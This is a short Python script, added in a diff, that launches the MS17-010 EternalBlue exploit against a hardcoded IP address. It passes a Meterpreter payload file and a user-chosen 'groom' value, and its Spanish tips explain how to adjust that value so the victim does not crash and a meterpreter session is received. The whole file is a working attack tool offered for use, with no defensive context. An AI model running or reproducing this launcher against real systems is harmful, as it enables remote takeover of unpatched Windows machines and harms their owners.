@@ -1,0 +1,35 @@
+#!/usr/bin/env python3
+
+
+try:
+	import os
+	from colorama import Fore, Style
+	import time
+
+
+	
+	IP_a_atacar = "192.168.1.164" 
+
+
+	groom = "13"
+
+	os.system("clear")
+	print()
+	print(Fore.CYAN + Style.BRIGHT + "RafaBLUE" + Style.RESET_ALL)
+	time.sleep(0.5)
+	print()
+	groom = input(Fore.YELLOW + "[+] Introduce la cantidad de potencia (ENTER para el predeterminado: 13): " + Style.RESET_ALL)
+	print()
+	ataque = f"python3 ms17_010_eternalblue.py {IP_a_atacar} meter.bin {groom} 2>/dev/null"
+	os.system(ataque)
+	print()
+	print(Fore.CYAN + "Tip: Si la maquina victima crashea, disminuye la poténcia.")
+	print("Si no recibes la sesión de meterpreter, aumentala. Acostumbra a empezar con poca y ve subiendo." + Style.RESET_ALL)
+	print()
+	print(Fore.GREEN + "Disfruta! ;)" + Style.RESET_ALL)
+
+except KeyboardInterrupt:
+	print()
+	print()
+	print(Fore.RED + Style.BRIGHT + " [!] Saliendo...")
+
